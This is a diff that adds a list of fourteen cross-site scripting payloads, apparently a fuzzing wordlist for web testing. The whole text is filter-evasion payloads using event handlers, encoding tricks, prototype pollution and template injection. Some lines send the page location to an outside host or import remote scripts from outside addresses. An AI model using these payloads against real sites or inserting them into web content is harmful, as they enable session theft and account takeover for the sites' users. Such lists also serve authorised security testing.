@@ -1,0 +1,14 @@
+"%3balert`1`%3b"
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+<x onauxclick=a=alert,a(domain)>click -@niksthehacker
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+asd"`> onpointerenter=x=prompt,x`XSS`
+javascript:new%20Function`al\ert\`1\``;
+{{constructor.constructor(alert`1`)()}}
